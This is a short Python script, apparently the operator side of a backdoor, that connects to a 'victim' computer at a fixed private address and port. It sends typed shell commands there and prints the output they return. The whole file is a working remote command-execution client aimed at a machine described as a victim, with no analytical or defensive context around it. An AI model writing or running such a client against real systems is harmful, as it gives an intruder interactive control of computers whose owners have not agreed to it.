#Import required to run file
import socket

#Connection data of victim computer
HOST = "192.168.56.105"
PORT = 65432

#Prints victim data
print("--- connected to victim at " + str(HOST) + "/" + str(PORT) + " ---\n")

#Main loop
while True:
  #Connects to the victim computer
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  
  #Takes as input a command, and sends it to the open port on the victim computer
  command = raw_input("victim terminal ~ $:")
  s.sendall(command)
  
  #Receives the output of the command being executed on the victim computer and prints it
  result = s.recv(1024)
  print("\n" + result)
